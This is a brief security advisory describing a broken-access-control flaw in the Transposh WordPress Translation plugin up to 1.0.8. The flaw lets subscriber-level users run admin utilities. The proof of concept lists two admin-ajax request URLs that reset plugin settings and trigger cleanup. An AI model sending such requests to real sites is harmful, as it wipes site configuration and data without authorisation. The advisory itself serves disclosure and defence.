## WordPress Plugin Vulnerabilities

# Transposh WordPress Translation <= 1.0.8 - Subscriber+ Unauthorised Calls

### Description

The plugin exposes a couple of sensitive actions such has “tp\_reset” under the Utilities tab (/wp-admin/admin.php?page=tp\_utils), which can be used/executed as the lowest-privileged user. Basically all Utilities functionalities are vulnerable this way, which involves resetting configurations and backup/restore operations.

### Proof of Concept

As a subscriber:
https://example.com/wp-admin/admin-ajax.php?action=tp\_reset
https://example.com/wp-admin/admin-ajax.php?action=tp\_cleanup&days=0
